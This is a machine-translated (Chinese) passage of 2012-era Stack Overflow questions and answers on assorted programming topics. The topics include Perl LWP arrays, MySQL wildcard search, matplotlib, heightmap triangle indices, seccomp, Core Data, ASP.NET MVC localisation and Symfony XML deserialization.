现在 UI 线程异步循环处理程序可以在异步完成期间正确恢复 TestRetrieve，并且您的代码将按预期工作。

如果要创建“异步构造函数”，则需要执行类似 Drew 的 GetCacheAsync 模式的操作，在该模式中创建一个静态异步方法，该方法同步构造对象，然后等待异步方法。这通过一直等待和“附加”上下文来创建正确的异步链。****

# perl - POST 数组到 LWP：只有第一个条目被发布

> ID：10114559
> 
> 赞同：0
> 
> 时间：2012-04-11T21:57:45.853
> 
> 标签：perl, post, lwp, lwp-useragent

这是代码部分，我正在尝试使用 LWP 发布整个数组，但服务器只接收数组的第一行（0 索引），而其他人没有被发送到服务器，请指导我做错了什么

```
$data_post[0] = "text1";
$data_post[1] = "text2";
$data_post[2] = "texxt3";
$data_post[3] = "text4";
$data_post[4] ="text5";
my $ua= LWP::UserAgent->new();
my $response = $ua->post( $url, { 'istring' => @data_post} );

my $content  = $response->decoded_content();
my $cgi = CGI->new();
print $cgi->header(), $content; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T22:01:15.967

您不能将数组分配给哈希键，只能分配一个标量。您的尝试将扩展数组并发送：

```
{ "istring" => "text1", "text2" => "texxt3", "text4" => "text5" } 
```

通过将“获取引用”运算符放在数组前面来使用数组 ref：

```
{ istring => \@data_post } 
```

# jms - 代理网络中的 ActiveMQ 消息传播

> ID：10114563
> 
> 赞同：2
> 
> 时间：2012-04-11T21:58:04.267
> 
> 标签：jms, activemq, messaging, broker

我们已经建立了一个带有两个集线器的集线器和辐条拓扑结构以实现冗余。连接到网络的**所有节点都具有到两个集线器的静态网络连接。**

如果我们为另一个轮辐产生的特定主题启动消费者，然后删​​除其中一个集线器，有时消费者将停止获取数据。如果关闭集线器 A 导致消费者停止接收数据，则恢复 A 将恢复消费者的提要。降低 B 对饲料没有影响。哪个集线器可能会影响消费者似乎不一致。

我们期望通过代理网络，只要生产者在网络上并且两者都连接到一个或多个集线器，消费者就应该始终获取数据。**这个期望是正确的还是我们需要改变我们的拓扑？**

每个节点都有一个如下所示的网络连接器：

```
static:(tcp://hub1,tcp://hub2) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T15:21:59.383

事实证明，网络连接器配置上的 staticallyIncludedDestinations 解决了这个问题。订阅仅在附加了消费者的代理上进行管理，并且不受集线器故障的影响。

4/25 更新：但是网络流量急剧增加。消息被连续转发，直到达到它们的 TTL。不是最好的解决方案...

# java - 如何在 j48 算法中注入 IBk(knn)？（韦卡，Java）

> ID：10114569
> 
> 赞同：1
> 
> 时间：2012-04-11T21:59:00.287
> 
> 标签：java, machine-learning, weka

我想在 weka 中编写一个基于 j48 决策树的分类器，它在叶子内部使用另一种分类算法。特别是我想要knn。

让我们看一个分类过程，例如：给定一个新实例，我想使用 j48 树到达“他的”叶子，然后不是返回与该叶子关联的类，而是返回 knn 算法将返回的分类该实例，基于到达该叶子的训练集实例。所以基本上我想在j48的分类方法中注入knn算法。

我正在寻找一种简单的“不要写太多”的方法来使用 weka API 在 java 中做到这一点。对我来说最糟糕的情况是编写我自己的决策树并用 knn 实现它。最好的情况是我是否可以将 j48 和 IBk 用作黑匣子并以某种方式制作这个“混合”分类器。

喜欢听到有关如何做到这一点的任何想法。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T12:46:53.633

一旦您离开并执行了 k-NN，显然不会使用 J48 的分类。这只留下了 k-NN 结果，据我所知，您可以只使用不带 J48 的 k-NN 来实现与上述设置相同的结果。

# sql - 用于 250K+ 字符串的通配符搜索的 Fast(er) 方法

> ID：10114574
> 
> 赞同：11
> 
> 时间：2012-04-11T21:59:09.087
> 
> 标签：sql, ruby, database, wildcard

我在 MySQL 数据库中有一本英语词典，条目刚刚超过 250K，我正在使用一个简单的 ruby​​ 前端在字符串开头使用通配符进行搜索。到目前为止，我一直在这样做：

```
SELECT * FROM words WHERE word LIKE '_e__o' 
```

甚至

```
SELECT * FROM words WHERE word LIKE '____s' 
```

我总是知道单词的确切长度，但除了单个字符之外的所有字符都可能是未知的。

这比 molasses 慢，比没有前导通配符的类似查询慢大约 15 倍，因为不能使用列的索引。

我尝试了一些方法来缩小搜索范围。例如，我添加了 26 个额外的列，其中包含每个单词的单个字母计数，并首先使用这些列来缩小搜索范围。我也尝试过按字长缩小。由于前导通配符搜索固有的低效率，这些方法几乎没有区别。我已经尝试过 REGEXP 语句，它甚至更慢。

SQLite 和 PostgreSQL 与 MySQL 一样有限，尽管我对 NoSQL 系统的经验有限，但我的研究给我的印象是它们擅长可扩展性，而不是我需要的那种性能。

那么我的问题是，我应该在哪里寻找解决方案？我是否应该继续尝试寻找优化查询的方法或添加可以缩小潜在记录集的补充列？是否有专门设计用于实现这种快速通配符搜索的系统？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T22:58:21.783

使用 PostgreSQL 9.1 和 pg_trgm 扩展，您可以创建可用于您描述的类似条件的索引。

有关示例，请参见此处： http: [//www.depesz.com/2011/02/19/waiting-for-9-1-faster-likeilike/](http://www.depesz.com/2011/02/19/waiting-for-9-1-faster-likeilike/)

我在一个有 300k 行的表上验证了它`LIKE '____1'`，它确实使用了这样的索引。计算该表中的行数大约需要 120 毫秒（在旧笔记本电脑上）。有趣的是，表达式`LIKE 'd___1'`并不是更快，而是差不多相同的速度。

它还取决于搜索词中的字符数，据我所知，搜索时间越长，速度就越慢。

如果性能可以接受，您需要检查您的数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:44:53.330

我假设最初插入单词和设置索引所花费的时间是无关紧要的。此外，您不会经常更新单词列表，因此它基本上是静态数据。

您可以尝试这样的方法：-

*   因为你总是知道单词长度，所以创建一个包含所有长度为 1 的单词的表，另一个包含长度为 2 的单词的表，等等。
*   进行查询时，根据字长从相应的表中选择。它仍然需要对该表进行全面扫描。

如果您的 RDBMS 允许，最好使用单个表和按字长进行分区。

如果这仍然不够快，您可以按长度和已知字母进一步拆分它。例如，您可以有一个表格，列出所有包含“Z”的 8 个字母单词。

当您查询时，您知道您有一个包含“E”和“Z”的 8 个字母的单词。首先查询数据字典，看看8个字母单词中哪个字母最稀有，然后扫描那个表。通过查询数据字典，我的意思是确定表`words_8E`或表`words_8z`的记录数是否最少。

*关于正常形式和良好实践*

这不是我在建模数据时通常会推荐的那种东西。在您的特定情况下，将整个单词存储在单个字符列中实际上并不是[第一范式](http://en.wikipedia.org/wiki/First_normal_form "第一范式")。这是因为您关心单词中的各个元素。给定您的用例，一个单词是一个字母列表，而不是一个单词。与往常一样，如何建模取决于您关心的内容。

您的查询给您带来麻烦，因为它不是第一范式。

这个问题的完全标准化模型将有两个表：word (WordId PK) 和 WordLetter (WordId PK, Position PK, Letter)。然后，您将查询在适当位置具有多个 WHERE EXISTS 字母的所有单词。

虽然根据数据库理论是正确的，但我认为这不会很好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T22:57:04.480

这一切都归结为索引。

您可以创建如下表：

```
create table letter_index (
    id integer not null primary key,
    letter varchar(1),
    position integer
)

create unique index letter_index_i1 (letter, position)

create table letter_index_words (
    letter_index_id integer,
    word_id integer
) 
```

然后索引你所有的单词。

如果您想要第二个位置带有“e”的所有单词的列表：

```
select words.* from words, letter_index_word liw, letter_index li
where li.letter = 'e' and li.position = 2
and liw.letter_index_id = li.id
and words.id = liw.word_id 
```

如果您想要所有带有“e”的单词在第二个位置，而“s”在第五个位置：

```
select words.* from words, letter_index_word liw, letter_index li
where li.letter = 'e' and li.position = 2
and liw.letter_index_id = li.id
and words.id = liw.word_id
and words.id in (
    select liw.word_id from letter_index_word liw, letter_index li
    where li.letter = 's' and li.position = 5
    and liw.letter_index_id = li.id
) 
```

或者您可以运行两个简单的查询并自己合并结果。

当然，简单地缓存和遍历内存中的列表可能比其中任何一个都快。但速度不够快，不值得每次都从数据库中加载 250K 列表。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-12T00:01:02.273

您可以完全索引此查询，而无需扫描超过最佳结果集大小的任何内容。

像这样创建一个查找表：

```
Table:  lookup
pattern     word_id
_o_s_       1
_ous_       1
... 
```

其中引用了您的单词表：

```
Table:  word
word_id     word
1           mouse 
```

在模式上放置一个索引并执行如下选择：

```
select w.word
from lookup l, word w
where l.pattern = '_ous_' and
l.word_id = w.word_id; 
```

当然，您需要一个小红宝石脚本来创建这个查找表，其中模式是字典中每个单词的所有可能模式。换句话说，鼠标的模式是：

```
m____
mo___
mou__
mous_
mouse
_o___
_ou__
... 
```

为给定单词生成所有模式的 ruby​​ 可能如下所示：

```
def generate_patterns word
  return [word, '_'] if word.size == 1
  generate_patterns(word[1..-1]).map do |sub_word|
    [word[0] + sub_word, '_' + sub_word]
  end.flatten
end 
```

例如：

```
> generate_patterns 'mouse'
mouse
_ouse
m_use
__use
mo_se
_o_se
m__se
___se
mou_e
_ou_e
m_u_e
__u_e
mo__e
_o__e
m___e
____e
mous_
_ous_
m_us_
__us_
mo_s_
_o_s_
m__s_
___s_
mou__
_ou__
m_u__
__u__
mo___
_o___
m____
_____ 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-12T02:28:08.043

将其降低 10 倍左右的一种快速方法是为字符串长度创建一个列，在其上放置一个索引，然后在 where 子句中使用它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-11T22:18:08.390

您可以尝试使用全文搜索引擎[Apache Lucene 。](http://lucene.apache.org/core/)它是为了回答这样的查询而设计的，所以你可能会有更多的运气。

[使用 lucene 进行通配符搜索](http://lucene.apache.org/core/old_versioned_docs/versions/3_0_0/queryparsersyntax.html#Wildcard%20Searches)。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-11T22:36:23.820

创建内存查找表解决方案：您可以为每个长度创建一个排序表。

然后匹配，假设你知道第 4 个和第 8 个字母，循环检查每个第 4 个字母的单词。它们都是相同的长度，所以会很快。仅当字母匹配时检查第 8 个字母。

这是蛮力，但会很快。假设最坏的情况是您有 50,000 个 8 个字母的单词。那是 50,000 次比较。假设 ruby​​ 运行时性能问题，它仍应小于 1 秒。

所需的内存为 250k x 10。所以 2.5 Meg。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-04-11T22:58:54.767

这更像是一种练习，而不是现实生活中的解决方案。这个想法是将单词分成字符。

让我们先设计所需的表。我假设您的`words`表有以下列`word_id, word, size`：

```
CREATE TABLE letter_search
( word_id INT NOT NULL
, position UNSIGNED TINYINT NOT NULL
, letter CHAR(1) NOT NULL
, PRIMARY KEY (word_id, position)
, FOREIGN KEY (word_id)
    REFERENCES words (word_id)
      ON DELETE CASCADE 
      ON UPDATE CASCADE
, INDEX position_letter_idx (position, letter)
, INDEX letter_idx (letter)
) ENGINE = InnoDB ; 
```

我们需要一个辅助“数字”表：

```
CREATE TABLE num
( i UNSIGNED TINYINT NOT NULL
, PRIMARY KEY (i)
) ;

INSERT INTO num (i)               --- I suppose you don't have
VALUES                            --- words with 100 letters
  (1), (2), ..., (100) ; 
```

填充我们的`letter_search`表格：

```
INSERT INTO letter_search
  ( word_id, position, letter )
SELECT
    w.word_id
  , num.i
  , SUBSTRING( w.word, num.i, 1 ) 
FROM 
    words AS w
  JOIN
    num
       ON num.i <= w.size 
```

此搜索表的大小约为 10 * 250K 行（其中 10，放置您的单词的平均大小）。

* * *

最后，查询：

```
SELECT * FROM words WHERE word LIKE '_e__o' 
```

将写为：

```
SELECT w.* 
FROM 
    words AS w
  JOIN
    letter_search AS s2
        ON (s2.position, s2.letter, s2.word_id) = (2, 'e', w.word_id)
  JOIN
    letter_search AS s5
        ON (s5.position, s5.letter, s5.word_id) = (5, 'o', w.word_id)
WHERE
    w.size = 5 
```

# python - 使用 Matplotlib imshow 将没有数据的点设置为白色

> ID：10114576
> 
> 赞同：10
> 
> 时间：2012-04-11T21:59:20.750
> 
> 标签：python, graph, matplotlib

我正在使用 matplotlib imshow 绘制来自 numpy 数组的数据。但是，有些点中没有数据。我使用 np.zeroes 初始化了数组，所以这些点正在拖拽整个地图。我知道没有任何数据的值为 0.0。我有什么方法可以告诉 imshow 例程忽略这些点（即让它们保持白色，这样很明显它们是空的）？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-11T22:08:41.640

您是否尝试过使用 NaN 而不是零来实例化数组，以查看 matplotlib 的默认设置是否会以适合您的方式忽略 NaN？您也可以尝试在绘图之前仅使用逻辑索引使 0 的位置等于 NaN：

```
my_data[my_data == 0.0] = numpy.nan 
```

或者，您可以使用 NaN 想法并[遵循此链接的建议](https://stackoverflow.com/questions/2578752/how-can-i-plot-nan-values-as-a-special-color-with-imshow-in-matplotlib)并使用 NumPy 掩码数组将 NaN 条目绘制为您喜欢的颜色。

我认为您也可以使用该链接的想法在零位置创建一个掩码数组，如果您不喜欢它，则无需使用 NaN 选项。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-19T15:25:26.640

对于不应该显示的点，使用 Python None 填充数组。

```
y_series_1 = [1,None,None,4,5]
y_series_2 = [1,2,5,6,7] 
```

对于此示例，y_series_1 线将从 X 轴的第二个和第三个点消失。结果是换行符（行开始，消失，然后在第四点继续），我相信这是您所追求的行为。

# c++ - 从加载的高度图中索引三角形的方法？

> ID：10114577
> 
> 赞同：3
> 
> 时间：2012-04-11T21:59:37.747
> 
> 标签：c++, graphics, indices, vertices

我目前正在制作一种加载嘈杂高度图的方法，但缺少这样做的三角形。我想制作一个算法来获取图像，它的宽度和高度，并从中构建一个地形节点。

这是我到目前为止所拥有的，有点伪

```
Vertex* vertices = new Vertices[image.width * image.height];
Index* indices; // How do I judge how many indices I will have?
float scaleX = 1 / image.width;
float scaleY = 1 / image.height;
float currentYScale = 0;

for(int y = 0; y < image.height; ++y) {
    float currentXScale = 0;
    for (int x = 0; x < image.width; ++x) {
       Vertex* v = vertices[x * y];
       v.x = currentXScale;
       v.y = currentYScale;
       v.z = image[x,y]; 
       currentXScale += scaleX;
    }
    currentYScale += scaleY;
} 
```

这足以满足我的需要，我唯一的问题是：我将如何计算索引的数量及其绘制三角形的位置？我对索引有些熟悉，但不熟悉如何以编程方式计算它们，我只能静态地做到这一点。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T22:05:04.793

就您上面的代码而言，使用`vertices[x * y]`是不正确的 - 如果您使用它，那么例如`vert(2,3) == vert(3,2)`. 你想要的是类似的东西`vertices[y * image.width + x]`，但你可以通过增加一个计数器来更有效地做到这一点（见下文）。

这是我使用的等效代码。不幸的是，它在 C# 中，但希望它应该说明这一点：

```
/// <summary>
/// Constructs the vertex and index buffers for the terrain (for use when rendering the terrain).
/// </summary>
private void ConstructBuffers()
{
    int heightmapHeight = Heightmap.GetLength(0);
    int heightmapWidth = Heightmap.GetLength(1);
    int gridHeight = heightmapHeight - 1;
    int gridWidth = heightmapWidth - 1;

    // Construct the individual vertices for the terrain.
    var vertices = new VertexPositionTexture[heightmapHeight * heightmapWidth];

    int vertIndex = 0;
    for(int y = 0; y < heightmapHeight; ++y)
    {
        for(int x = 0; x < heightmapWidth; ++x)
        {
            var position = new Vector3(x, y, Heightmap[y,x]);
            var texCoords = new Vector2(x * 2f / heightmapWidth, y * 2f / heightmapHeight);
            vertices[vertIndex++] = new VertexPositionTexture(position, texCoords);
        }
    }

    // Create the vertex buffer and fill it with the constructed vertices.
    this.VertexBuffer = new VertexBuffer(Renderer.GraphicsDevice, typeof(VertexPositionTexture), vertices.Length, BufferUsage.WriteOnly);
    this.VertexBuffer.SetData(vertices);

    // Construct the index array.
    var indices = new short[gridHeight * gridWidth * 6];    // 2 triangles per grid square x 3 vertices per triangle

    int indicesIndex = 0;
    for(int y = 0; y < gridHeight; ++y)
    {
        for(int x = 0; x < gridWidth; ++x)
        {
            int start = y * heightmapWidth + x;
            indices[indicesIndex++] = (short)start;
            indices[indicesIndex++] = (short)(start + 1);
            indices[indicesIndex++] = (short)(start + heightmapWidth);
            indices[indicesIndex++] = (short)(start + 1);
            indices[indicesIndex++] = (short)(start + 1 + heightmapWidth);
            indices[indicesIndex++] = (short)(start + heightmapWidth);
        }
    }

    // Create the index buffer.
    this.IndexBuffer = new IndexBuffer(Renderer.GraphicsDevice, typeof(short), indices.Length, BufferUsage.WriteOnly);
    this.IndexBuffer.SetData(indices);
} 
```

我想关键是给定一个 size 的高度图`heightmapHeight * heightmapWidth`，你需要`(heightmapHeight - 1) * (heightmapWidth - 1) * 6`索引，因为你正在绘制：

*   `2`每个网格正方形的三角形
*   `3`每个三角形的顶点
*   `(heightmapHeight - 1) * (heightmapWidth - 1)`地形中的网格方块。

# c# - 在堆栈跟踪中打印参数的值

> ID：10114578
> 
> 赞同：6
> 
> 时间：2012-04-11T21:59:42.133
> 
> 标签：c#, reflection, parameters, stack-trace, stack-frame

使用`System.Diagnostics`. 我想知道是否可以在堆栈跟踪中打印传递给每个方法的参数的值，如果不能，为什么不打印。

这是我的初步代码：

```
public static class CallStackTracker
{
    public static void Print()
    {
        var st = new StackTrace();
        for (int i = 0; i < st.FrameCount; i++)
        {
            var frame = st.GetFrame(i);
            var mb = frame.GetMethod();
            var parameters = mb.GetParameters();
            foreach (var p in parameters)
            {
                // Stuff probably goes here, but is there another way?
            }
        }
    }
} 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:07:11.923

你不能这样做，至少不能使用`System.Diagnostics`. 该类`StackFrame`不提供访问参数值的方法（`MethodBase.GetParameters`提供有关声明参数的信息，例如它们的名称和类型，但不提供实际参数的值）

我认为使用 CLR 调试 API 可以做到这一点，但可能不是来自 C#

# jquery - 在 jQuery 中创建一个 GET

> ID：10114579
> 
> 赞同：0
> 
> 时间：2012-04-11T21:59:42.957
> 
> 标签：jquery, get

在 PHP 中它是`file.php?id=1`然后`$_GET['id']`，但是在 jQuery 中它是怎样的呢？我试过跟随，但没有奏效。

```
// jQuery
$('id-' + $1).click(function() {
    // more code
}

// HTML
<div id="id-1">text</div> 
```

我是`GET`jQuery 的新手，所以请善待：P

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:05:28.523

你应该解析 location.search：

```
var GET = {};
var params = location.search.substr(1).split("&");
for (var i=0; i < params.length; i++) {
    var par = params[i].split('=');
    GET[par[0]] = par[1];
}

$('#id-' + GET["id"]).click(function() {
    // more code
});
$(document).ready(function() {
    $('#id-' + GET["id"]).click(function() {
        $('#forecast').show().load('jquery-fetch/fetch-forecast.php?coor=' + GET["coor"] + '&d=' + $(this).attr('id'));
        $('#current').hide();
    });
});​

// HTML
<div id="id-1">text</div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:04:01.917

你的意思是 GUP（获取 url 参数）吗？

在 javascript 中，这与 GET 无关，GET 是浏览器用来制定对服务器的请求的一种方法。要从 JS 中获取 URL 参数，请执行以下操作：

```
var gup = function( name ) {
    var results = (new RegExp("[\\?&]"+name+"=([^&#]*)")).exec(window.location.href);
    if ( results == null ) {return ""}
    else {return results[1]}
}; 
```

其中 name 是您要检索的字符串。

```
$('id-' + $1).click(function() {
    var myId = gup("id");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:05:30.247

这可能是您正在寻找的，虽然它只是纯 JS，但不确定 jQuery 是否有更简单的方法：

```
function gup( name )
{
  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
  var regexS = "[\\?&]"+name+"=([^&#]*)";
  var regex = new RegExp( regexS );
  var results = regex.exec( window.location.href );
  if( results == null )
    return "";
  else
    return results[1];
} 
```

然后像这样使用它：

```
var id_param = gup( 'id' ); 
```

来自[http://www.netlobo.com/url_query_string_javascript.html](http://www.netlobo.com/url_query_string_javascript.html)

# c - 为什么 seccomp 进程总是被杀死？

> ID：10114583
> 
> 赞同：3
> 
> 时间：2012-04-11T22:00:05.567
> 
> 标签：c, linux, seccomp

为什么进入 seccomp 模式的进程总是在退出时被杀死？

```
$ cat simple.c 
#include <stdio.h>
#include <stdlib.h>
#include <linux/prctl.h>

int main( int argc, char **argv )
{
    printf("Starting\n");
    prctl(PR_SET_SECCOMP, 1);
    printf("Running\n");
    exit(0);
}
$ cc -o simple simple.c
$ ./simple || echo "Returned $?"
Starting
Running
Killed
Returned 137 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T22:17:14.080

在手册页的 PR_SET_SECCOMP 下，唯一允许的系统调用是 read、write、exit 和 sigreturn。

当您在标准库（在最近的 Linux 中）中调用 exit(0) 时，您调用的是 exit_group 系统调用，而不是退出。这是不允许的，所以你会得到一个 SIGKILL。

（如果你跟踪这个过程，你可以看到这一点......）

# iphone - 在 Core Data 中建模一对多关系

> ID：10114584
> 
> 赞同：0
> 
> 时间：2012-04-11T22:00:12.547
> 
> 标签：iphone, objective-c, ios, core-data

我有两个实体：`Group`和`Member`：

```
Entity name: Group
Relationships:
Member (inverse:Group) (to-many relationship)

Entity name: Member
Relationships:
Group (inverse:Member) 
```

所以a`Group`可以有多个成员，同一个Member可以属于多个Group，但是`Members`不知道自己属于哪个组（没有逆向）

但奇怪的事情正在发生。如果我将成员添加到`GroupA`，则他已成功添加。如果我将同一个成员添加到`GroupB`，他会从 中删除`GroupA`并添加到`GroupB`。任何想法为什么会发生这种情况？我是否正确设置了模型？

编辑：设置反向关系，但这并没有解决问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:09:15.673

我不确定这是否是您所看到的原因，但即使您不使用它，始终建立反向关系也是一个非常非常非常好的主意。见[https://stackoverflow.com/a/764572/144755](https://stackoverflow.com/a/764572/144755)

*编辑：我建议从* *实体中添加一个*`Groups` *多对多关系。* `Member` *听起来正在发生的事情是CoreData猜测关系 from* `Member` `to` `Group` *是一对一*

# asp.net - （历史）ASP.NET MVC 国际化的最佳实践

> ID：10114586
> 
> 赞同：3
> 
> 时间：2012-04-11T22:00:23.457
> 
> 标签：asp.net, asp.net-mvc, internationalization, webforms

我正在尝试完全理解这个话题，我不相信我能做到这一点，除非除了当前的推荐之外，我还了解推荐的历史。

我对这段历史的简要概述如下，我想知道它是否基本正确？

1.  ASP.NET 1.1 推荐使用 Satellite Assemblies 和 ResourceManager 类
2.  [ASP.NET 2.0 切换到建议使用 .resource 文件](http://drdobbs.com/windows/188700729)（未加载到 DLL 中）并通过 HttpContext.GetGlobalResourceObject 访问它们
    *   卫星程序集仍在生成中，但它们是在运行时不可见地创建的。
    *   “GetGlobalResourceObject”为您检查 HTTP 标头文化信息，同时还选择了资源。
3.  [强调可测试性的 ASP.NET MVC 恢复到卫星程序集/ResourceManager 类作为](http://odetocode.com/Blogs/scott/archive/2009/07/16/resource-files-and-asp-net-mvc-projects.aspx)访问 I18N 资源的主要建议。
    *   在 ASP.NET 运行时生成附属程序集与尝试访问资源的单元测试框架不兼容。
    *   使用 ResourceManager 需要开发人员做更多的工作（因为他们必须编写代码来检查文化的会话、cookie 或 HTTP 标头信息），但也更灵活，因为 (1) 它允许更多人选择文化不仅仅是 HTTP 标头，并且 (2) 允许单元测试轻松地指示正在使用的文化。

我从上面的摘要中遗漏了哪些重要的细节或警告？我的 MVC 评论仍然被认为是 MVC3（和 MVC4）的“最新”吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-23T05:09:06.453

**Asp.Net MVC 框架简史**

ASP.Net MVC 是建立在 Microsoft .Net Framework 之上的新框架，用于开发 Web 应用程序。该框架实现了 MVC 模式，有助于提供代码分离并为测试驱动开发 (TDD) 提供更好的支持。Asp.Net MVC 是一个轻量级且高度可测试的开源框架，用于构建高度可扩展且设计良好的 Web 应用程序。以下是 ASP.NET MVC Framework 的已发布版本历史列表及其功能。

**Asp.Net MVC1**

于 2009 年 3 月 13 日发布

在 .Net 3.5 和 Visual Studio 2008 和 Visual Studio 2008 SP1 上运行
带有 WebForm 引擎
Html 助手的模式架构
Ajax 助手
路由
单元测试

**Asp.Net MVC2**

2010 年 3 月 10 日发布

在 .Net 3.5、4.0 和 Visual Studio 2008 上运行& 2010
强类型 HTML 助手意味着基于 lambda 表达式的 Html 助手
模板化助手
支持数据注释 属性
客户端验证
UI 助手，带有自动脚手架和可定制模板
基于属性的客户端和服务器上的模型验证
覆盖 HTTP 方法动词，包括 GET、PUT 、发布和删除
将大型应用程序划分为模块的区域
异步控制器

**Asp.Net MVC3**

于 2011 年 1 月 13 日发布

在 .Net 4.0 和 Visual Studio 2010 上运行
Razor 视图引擎
改进了对数据注释的支持
远程验证
比较属性
无会话控制器
子动作输出 缓存
依赖解析器
实体框架 代码优先支持
部分页面输出缓存
ViewBag 动态属性，用于将数据从控制器传递到视图
全局操作过滤器
通过不显眼的 JavaScript、jQuery 验证和 JSON 绑定提供更好的 JavaScript 支持
使用 NuGet 在整个平台上交付软件和管理依赖项
对 Razor 到 Visual Studio 的良好 Intellisense 支持

**Asp.Net MVC4**

于 2012 年 8 月 15 日发布

在 .Net 4.0、4.5 和 Visual Studio 2010SP1 和 Visual Studio 2012 上运行
ASP.NET Web API
对默认项目模板的增强
使用 jQuery Mobile
显示模式的移动项目模板 异步控制器 捆绑
的任务支持 支持 Windows Azure SDK **Asp.Net MVC5**
于 2013 年 10 月 17 日发布 在 .Net 4.5、4.5.1 和 Visual Studio 2013 上运行 一个 Asp.Net Asp.Net Identity ASP.NET Scaffolding 身份验证过滤器 - 在授权之前运行ASP.NET MVC 管道中的过滤器 MVC 模板中的引导 程序 ASP.NET Web API2

 **致谢：Shailendra Chauhan 先生

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T09:06:27.953

卫星汇编的一大优势是您不必重新构建应用程序来引入新语言。您可以为新语言创建附属程序集并将其放入应用程序中，ResourceManager 将根据文化自动加载它

如果您使用 .resource 文件，您将重建整个应用程序并且必须进行另一次部署。**

# c# - WindowsForm 控件作为参数

> ID：10114588
> 
> 赞同：2
> 
> 时间：2012-04-11T22:00:30.253
> 
> 标签：c#, winforms, oop, parameters

我的问题很简单。

我在一个类中有一个方法，我希望这个方法可以更改`TextBox`. 在`TextBox`运行时可能会发生变化，所以我试图找到一种`TextBox` 在调用方法时将控件作为参数传递的方法。

这甚至可能吗？

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T22:02:01.177

是的，当然，绝对有可能……控件和其他任何对象一样都是对象，因此它可以作为参数传递或存储在变量中

```
void SayHello(TextBox textBox)
{
    textBox.Text = "Hello world";
}

...

SayHello(textBox1); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-12T04:13:10.527

只是为了增加一点：

1.  您可以将任何**类、接口、委托、结构** 作为参数传递给方法。在您的场景中 TextBox 是一个类，因此您可以将其作为参数传递给方法。

2.  当您将任何引用类型（字符串除外）传递给 Method 时，不会对传递的对象进行克隆，并且对传递的对象的更改将反映已发送的对象。例如：

    ```
    void  Method1 ()
    {
     DataSet ds = new DataSet();
     ..do some opeartion on ds.....          
     Method2(ds);
     ..print details of ds
    }

    Method2(DataSet myds)
    {
     ..do something to ds
    } 
    ```

    您会注意到在 Method1 中调用 Method2 后，数据集对象 ds 发生了变化。

3.  对于上面的案例 2 申请值类型，将参数作为**ref**传递：

    ```
     void Method2(ref int count)
      {
           count = count++;
      } 
    ```

    在这里，如果您将任何整数传递给此方法，则传递的整数将导致更改。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-06-15T13:34:40.203

如果要将控件用作类中的参数，则需要在顶部使用它们的命名空间，例如 ;

```
using System.Windows.Forms;

namespace myprojectnamespace
{
    class myClass
    {
        public void myMethod(TextBox mytex, RichTextBox searchStr)
        {
          // ..Codes Here
        }
} 
```

# ruby-on-rails-3 - Rails - 创建数据库条目

> ID：10114589
> 
> 赞同：0
> 
> 时间：2012-04-11T22:00:30.817
> 
> 标签：ruby-on-rails-3

假设我使用这个创建了一个表格 People：

```
rails new app; cd app; rails g scaffold Person name:string; rake db:migrate 
```

然后尝试使用以下方法设置行的名称：

```
rails console
Loading development environment (Rails 3.2.3)
1.9.2p318 :001 > @person = Person
=> Person(id: integer, name: string, created_at: datetime, updated_at: datetime) 
1.9.2p318 :002 > @person.name = "test"
NoMethodError: undefined method `name=' for #<Class:0x007f9b8d807098> 
```

为什么最后一行因未定义的方法而失败？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:07:39.503

您`@person = Person`的字面意思是 @person 是 Person 类。

你应该使用`@person = Person.new()`. 您现在可以分配属性，因为实例变量是一个新的 Person 对象。

# php - 使用 Symfony2 将 xml 反序列化为对象

> ID：10114591
> 
> 赞同：5
> 
> 时间：2012-04-11T22:00:45.560
> 
> 标签：php, xml, symfony, xml-serialization, xml-deserialization

我通过 API 收集一些 xml 格式的数据，并希望将其反序列化到对象列表中。我正在使用 Symfony2 并找出 JMSSerializerBundle 但我真的不知道如何使用它。

我知道 Sf2 允许序列化/反序列化对象到/从数组，但我正在寻找更具体的东西。例如，对于此类：

```
class Screenshot
{
    /**
     * @var integer $id
     */
    private $id;

    /**
     * @var string $url_screenshot
     */
    private $url_screenshot;

    public function __construct($id, $url_screenshot) {
        $this->id = $id;
        $this->url_screenshot = $url_screenshot;
    }

    /**
     * Get id
     *
     * @return integer 
     */
    public function getId()
    {
        return $this->id;
    }

    /**
     * Set url_screenshot
     *
     * @param string $urlScreenshot
     */
    public function setUrlScreenshot($urlScreenshot)
    {
        $this->url_screenshot = $urlScreenshot;
    }

    /**
     * Get url_screenshot
     *
     * @return string 
     */
    public function getUrlScreenshot()
    {
        return $this->url_screenshot;
    }

    /**
     * Serializes the Screenshot object.
     *
     * @return string
     */
    public function serialize()
    {
        return serialize(array(
            $this->id,
            $this->url_screenshot
        ));
    }

    /**
     * Unserializes the Screenshot object.
     *
